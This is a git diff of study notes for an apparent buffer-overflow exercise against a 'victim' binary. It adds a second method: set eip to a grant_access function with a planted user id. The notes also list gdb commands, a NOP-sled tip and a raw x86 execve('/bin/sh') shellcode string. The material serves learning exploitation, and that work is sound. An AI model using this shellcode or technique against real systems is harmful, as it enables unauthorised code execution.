@@ -24,6 +24,8 @@ You have to place the null character manually
 
 ## Step 2
 
+First approach
+
 ```sh
 id -ur #1000
 printf '%x\n' 1000 #0x3e8
@@ -34,6 +36,13 @@ gdb victim
 (gdb) b * 0x80492b3 # before cmp
 (gdb) set $eax = 0x3e8
 ```
+
+Second approach
+
+- argument passed to the grant_access, is saved in ebp-0x8
+- so i put my user id inside ebp-0x8
+- then set eip to the address of grant_access
+- check out [step2.py](./step2.py)
 
 ## Step3
 
@@ -92,8 +101,6 @@ id= struct.pack("I", 0x3e8) 4
 for debuging # x/16wx 0xffefffc4
 ```
 
-call 0x080492a2"\xE8\x9E\x92\x04\x08"
-
 ## Step 4
 
 - Use NOPs and retired to estimated point/address.
@@ -111,7 +118,7 @@ Hijack Victim OS
 - `ebp`: is usually set to esp at the start of the function.
 - `lea` https://www.aldeid.com/wiki/X86-assembly/Instructions/lea
 - NOP \x90
-- INT3 \xCC braekpoint
+- INT3 \xCC breakpoint
 
 ## Endian
 
@@ -122,15 +129,11 @@ Hijack Victim OS
 
 - https://www.asciitohex.com/
 - https://defuse.ca/online-x86-assembler.htm#disassembly
-- [Great Intro for ASM](https://www.youtube.com/watch?v=75gBFiFtAb8)
-- [Helper Exploit-Exercises-Protostar](https://github.com/z3tta/Exploit-Exercises-Protostar)
+- https://github.com/z3tta/Exploit-Exercises-Protostar
 - https://0xrick.github.io/binary-exploitation/bof6/
 - [Py.Struct](https://docs.python.org/2/library/struct.html)
 - <http://shell-storm.org/>
 - <http://shell-storm.org/shellcode/>
-- <https://www.youtube.com/watch?v=oS2O75H57qU>
-- <https://www.youtube.com/watch?v=T03idxny9jE>
-- <http://shell-storm.org/shellcode/files/shellcode-811.php>
 - \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 - [To execute shell code, you can edit a function's contents directly](https://stackoverflow.com/questions/5661021/how-to-run-assembly-in-gdb-directly)
 
